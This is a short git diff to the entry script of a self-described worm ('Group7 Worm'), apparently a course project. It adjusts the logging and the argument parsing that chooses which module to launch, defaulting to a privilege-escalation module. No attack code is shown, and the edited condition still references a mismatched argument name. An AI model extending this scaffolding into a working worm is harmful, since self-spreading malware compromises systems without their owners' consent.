@@ -4,7 +4,6 @@
 
 import os
 import argparse
-import subprocess
 from time import sleep
 
 from modules import privesc
@@ -105,6 +104,7 @@ def main(start_module):
 ###########################################################################################################################
 
 if __name__ == "__main__":
+    print("[+] Starting worm...")
     # parse argument
     parser = argparse.ArgumentParser(description="Group7 Worm")
     parser.add_argument(
@@ -119,12 +119,12 @@ if __name__ == "__main__":
     # args.m contains module to start
     # ex: python3 main.py -m privesc
     # args.m = "privesc"
-    if args.myarg is not None and isinstance(args.myarg, str):
+    if args.m is not None and isinstance(args.myarg, str):
         start_module = args.m
-        print(f"myarg is a valid string: {args.myarg}")
+        print(f"[+] Selected module: {start_module}")
     else:
-        print("Start argument not valid :(")
-        print("Using default: privesc")
+        print("[-] Wrong module")
+        print("[-] Using default: privesc")
         start_module = "privesc"
 
     main(start_module)
